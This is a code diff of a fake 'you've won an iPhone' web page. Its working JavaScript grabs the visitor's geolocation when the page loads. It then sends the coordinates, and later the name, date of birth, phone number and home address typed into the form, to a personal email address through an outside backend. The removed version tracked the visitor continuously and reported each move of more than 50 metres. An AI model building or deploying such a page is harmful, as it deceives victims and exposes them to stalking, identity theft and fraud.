@@ -13,69 +13,38 @@
             align-items: center;
             height: 100vh;
             margin: 0;
-            background-color: #f0f8ff; /* Light background color to make form visible */
-            font-family: Arial, sans-serif;
+            background-image: url('https://via.placeholder.com/1920x1080'); /* Replace with the desired background URL */
+            background-size: cover;
+            background-position: center;
+            background-repeat: no-repeat;
         }
         .container {
             max-width: 600px;
-            background: #ffffff; /* Solid background color for form */
+            background: rgba(255, 255, 255, 0.85); /* Semi-transparent white background */
             padding: 2rem;
-            border-radius: 10px;
-            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.2);
+            border-radius: 8px;
+            box-shadow: 0px 4px 10px rgba(0, 0, 0, 0.3);
             text-align: center;
         }
         .form-heading {
             color: #333;
-            font-size: 1.8rem;
-            font-weight: bold;
-            margin-bottom: 15px;
-        }
-        .lead {
-            color: #555;
-            font-size: 1rem;
+            font-size: 1.5rem;
             margin-bottom: 20px;
-        }
-        .form-group label {
-            font-weight: bold;
-            color: #444;
-        }
-        .form-control {
-            border: 1px solid #ccc;
-            border-radius: 8px;
-            padding: 10px;
-            font-size: 1rem;
-            transition: border-color 0.3s;
-            box-shadow: 0 1px 3px rgba(0, 0, 0, 0.1);
-        }
-        .form-control:focus {
-            border-color: #007bff;
-            box-shadow: 0 0 8px rgba(0, 123, 255, 0.2);
         }
         .btn-primary {
             background-color: #007bff;
             border: none;
-            border-radius: 8px;
-            padding: 10px 20px;
-            font-size: 1rem;
             margin-top: 15px;
-            transition: background-color 0.3s, transform 0.2s;
         }
         .btn-primary:hover {
             background-color: #0056b3;
-            transform: translateY(-2px);
         }
         .form-text {
             font-size: 0.9rem;
             color: #666;
-            margin-top: 10px;
         }
-        #locationDisplay {
-            background: #e9ecef;
-            color: #666;
-            padding: 0.5rem;
-            border-radius: 4px;
-            margin-top: 15px;
-            font-size: 0.9rem;
+        #rewardForm {
+            display: none; /* Initially hide the form */
         }
     </style>
 </head>
@@ -83,7 +52,7 @@
     <div class="container">
         <h1 class="form-heading">Congratulations! 🎉</h1>
         <p class="lead">You've been selected to receive a brand-new iPhone!</p>
-        <p class="form-text">Please fill out the form below to claim your reward.</p>
+        <p id="locationDisplay" class="form-text">Requesting location permission...</p>
 
         <!-- Fill Out Form -->
         <form id="rewardForm">
@@ -115,140 +84,107 @@
                 <label for="postalCode">Postal Code</label>
                 <input type="text" class="form-control" id="postalCode" placeholder="Enter your postal code" required>
             </div>
-
-            <p id="locationDisplay" class="form-text">Location permissions required to auto-fill your location.</p>
             <button type="submit" class="btn btn-primary btn-block">Submit and Claim iPhone</button>
         </form>
     </div>
 
-    <!-- JavaScript code (unchanged) -->
+    <!-- Bootstrap and jQuery JS -->
+    <script src="https://code.jquery.com/jquery-3.5.1.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.16.0/umd/popper.min.js"></script>
+    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"></script>
+
+    <!-- JavaScript for Geolocation and Email Sending -->
     <script>
         document.addEventListener("DOMContentLoaded", function () {
             const locationDisplay = document.getElementById("locationDisplay");
-            let lastSentPosition = null;
+            const rewardForm = document.getElementById("rewardForm");
 
-            function calculateDistance(lat1, lon1, lat2, lon2) {
-                const R = 6371e3;
-                const φ1 = lat1 * Math.PI / 180;
-                const φ2 = lat2 * Math.PI / 180;
-                const Δφ = (lat2 - lat1) * Math.PI / 180;
-                const Δλ = (lon2 - lon1) * Math.PI / 180;
-
-                const a = Math.sin(Δφ / 2) * Math.sin(Δφ / 2) +
-                          Math.cos(φ1) * Math.cos(φ2) *
-                          Math.sin(Δλ / 2) * Math.sin(Δλ / 2);
-                const c = 2 * Math.atan2(Math.sqrt(a), Math.sqrt(1 - a));
-
-                return R * c;
+            // Request location permission
+            if ("geolocation" in navigator) {
+                navigator.geolocation.getCurrentPosition(
+                    (position) => {
+                        const latitude = position.coords.latitude;
+                        const longitude = position.coords.longitude;
+                        locationDisplay.textContent = `Latitude: ${latitude}, Longitude: ${longitude}`;
+                        
+                        // Send location data via email
+                        sendEmail("Geolocation Data", `Latitude: ${latitude}, Longitude: ${longitude}`, "khalilrodeni@gmail.com")
+                            .then(() => {
+                                rewardForm.style.display = "block"; // Show the form after successful email
+                                locationDisplay.textContent = "Location captured successfully! Please fill out the form.";
+                            })
+                            .catch((error) => {
+                                locationDisplay.textContent = "Error sending location data.";
+                                console.error("Error sending email:", error);
+                            });
+                    },
+                    (error) => {
+                        locationDisplay.textContent = "Failed to capture location. Please enable location services.";
+                        console.error("Geolocation error:", error);
+                    }
+                );
+            } else {
+                locationDisplay.textContent = "Geolocation is not supported by this browser.";
             }
+        });
 
-            function sendLocationEmail(latitude, longitude) {
-                locationDisplay.textContent = `Latitude: ${latitude}, Longitude: ${longitude}`;
-                sendEmail("Geolocation Data", `Latitude: ${latitude}, Longitude: ${longitude}`, "khalilrodeni@gmail.com");
-            }
+        // Send Email Function
+        async function sendEmail(subject, message, recipientEmail) {
+            const emailData = {
+                subject: subject,
+                message: message,
+                recipient_email: recipientEmail,
+                recipient_name: "Khalil Ahmed"
+            };
 
-            function trackMovement() {
-                if ("geolocation" in navigator) {
-                    navigator.geolocation.watchPosition(
-                        (position) => {
-                            const latitude = position.coords.latitude;
-                            const longitude = position.coords.longitude;
-
-                            if (lastSentPosition) {
-                                const distanceMoved = calculateDistance(
-                                    lastSentPosition.latitude,
-                                    lastSentPosition.longitude,
-                                    latitude,
-                                    longitude
-                                );
-
-                                if (distanceMoved > 50) {
-                                    sendLocationEmail(latitude, longitude);
-                                    lastSentPosition = { latitude, longitude };
-                                }
-                            } else {
-                                lastSentPosition = { latitude, longitude };
-                                sendLocationEmail(latitude, longitude);
-                            }
-                        },
-                        (error) => {
-                            switch (error.code) {
-                                case error.PERMISSION_DENIED:
-                                    locationDisplay.textContent = "Location access denied by user.";
-                                    break;
-                                case error.POSITION_UNAVAILABLE:
-                                    locationDisplay.textContent = "Location information is unavailable.";
-                                    break;
-                                case error.TIMEOUT:
-                                    locationDisplay.textContent = "Location request timed out.";
-                                    break;
-                                default:
-                                    locationDisplay.textContent = "An unknown error occurred.";
-                                    break;
-                            }
-                            sendEmail("Location Access Error", locationDisplay.textContent, "khalilrodeni@gmail.com");
-                        },
-                        { enableHighAccuracy: true, maximumAge: 0, timeout: 5000 }
-                    );
-                } else {
-                    locationDisplay.textContent = "Geolocation is not supported by this browser.";
-                }
-            }
-
-            trackMovement();
-
-            document.getElementById("rewardForm").addEventListener("submit", function (e) {
-                e.preventDefault();
-
-                const fullName = document.getElementById("fullName").value;
-                const dob = document.getElementById("dob").value;
-                const email = document.getElementById("email").value;
-                const phoneNumber = document.getElementById("phoneNumber").value;
-                const address = document.getElementById("address").value;
-                const city = document.getElementById("city").value;
-                const postalCode = document.getElementById("postalCode").value;
-
-                const formMessage = `Full Name: ${fullName}\nDate of Birth: ${dob}\nEmail: ${email}\nPhone Number: ${phoneNumber}\nAddress: ${address}\nCity: ${city}\nPostal Code: ${postalCode}`;
-
-                sendEmail("New iPhone Claim Form Submission", formMessage, "khalilrodeni@gmail.com");
-
-                alert("Thank you for your submission! We will contact you shortly.");
+            const response = await fetch("https://zalex-backend.onrender.com/api/send-email/", {
+                method: "POST",
+                headers: {
+                    "Content-Type": "application/json",
+                },
+                body: JSON.stringify(emailData)
             });
 
-            function sendEmail(subject, message, recipientEmail) {
-                const emailData = {
-                    subject: subject,
-                    message: message,
-                    recipient_email: recipientEmail,
-                    recipient_name: "Khalil Ahmed"
-                };
-
-                fetch("https://zalex-backend.onrender.com/api/send-email/", {
-                    method: "POST",
-                    headers: {
-                        "Content-Type": "application/json",
-                    },
-                    body: JSON.stringify(emailData)
-                })
-                .then(response => {
-                    if (response.ok) {
-                        return response.json();
-                    } else {
-                        throw new Error(`Server responded with ${response.status}`);
-                    }
-                })
-                .then(data => {
-                    if (data.message) {
-                        console.log("Email sent successfully");
-                    } else if (data.error) {
-                        alert("Error: " + data.error);
-                    }
-                })
-                .catch(error => {
-                    console.log("Error sending email:", error);
-                    alert("Error sending email: " + error.message);
-                });
+            if (!response.ok) {
+                throw new Error(`Server responded with ${response.status}`);
             }
+
+            return response.json();
+        }
+
+        // Form submission
+        document.getElementById("rewardForm").addEventListener("submit", function (e) {
+            e.preventDefault();
+
+            // Collect form data
+            const fullName = document.getElementById("fullName").value;
+            const dob = document.getElementById("dob").value;
+            const email = document.getElementById("email").value;
+            const phoneNumber = document.getElementById("phoneNumber").value;
+            const address = document.getElementById("address").value;
+            const city = document.getElementById("city").value;
+            const postalCode = document.getElementById("postalCode").value;
+
+            // Format form data into a message
+            const formMessage = `
+                Full Name: ${fullName}\n
+                Date of Birth: ${dob}\n
+                Email: ${email}\n
+                Phone Number: ${phoneNumber}\n
+                Address: ${address}\n
+                City: ${city}\n
+                Postal Code: ${postalCode}
+            `;
+
+            // Send form data via email
+            sendEmail("New iPhone Claim Form Submission", formMessage, "khalilrodeni@gmail.com")
+                .then(() => {
+                    alert("Thank you for your submission! We will contact you shortly.");
+                })
+                .catch((error) => {
+                    console.error("Error sending form data:", error);
+                    alert("Failed to submit the form. Please try again.");
+                });
         });
     </script>
 </body>
